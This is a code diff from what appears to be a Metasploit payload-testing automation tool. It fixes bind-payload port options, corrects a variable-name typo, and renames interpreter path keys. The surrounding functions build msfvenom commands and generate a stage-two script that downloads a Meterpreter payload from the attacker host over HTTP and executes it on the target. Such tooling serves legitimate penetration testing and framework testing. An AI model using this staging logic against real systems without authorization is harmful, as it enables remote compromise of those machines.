@@ -103,7 +103,7 @@ def makeVenomCmd(targetData, sessionData, portTracker, logFile):
     msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
     # ADD HOST DATA
     if 'bind' in payloadType.lower():
-        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " RPORT=" + str(payloadData['PRIMARY_PORT'])
+        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
     else:
         msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
     for settingEntry in payloadData['SETTINGS']:
@@ -141,7 +141,7 @@ def makeRcScript(cmdList, targetData, sessionData, logFile):
             rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
         if 'bind' in sessionData['PAYLOAD']['NAME']:
             rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
-            rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
+            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
         if 'reverse' in sessionData['PAYLOAD']['NAME']:
             rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
             rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
@@ -192,15 +192,15 @@ def makeStageTwoPyScript(targetData, httpPort):
     execute it
     """
     for sessionData in targetData['SESSION_DATASETS']:
-        if 'PAYLOAD' in sessionData and sessoinData['MODULE']['NAME'].lower() == "exploit/multi/handler":
+        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
             msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
             payloadFile = sessionData['PAYLOAD']['FILENAME']
             stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
             stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
             if '.py' in payloadFile:
-                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['PYTHON_PATH'] +"', fileName]\n"
+                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_PYTHON'] +"', fileName]\n"
             elif 'jar' in payloadFile:
-                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['JAVA_PATH'] + "','-jar', fileName]\n"
+                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_JAVA'] + "','-jar', fileName]\n"
             else:
                 stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
             stageTwoPyContent = stageTwoPyContent + "try:\n"
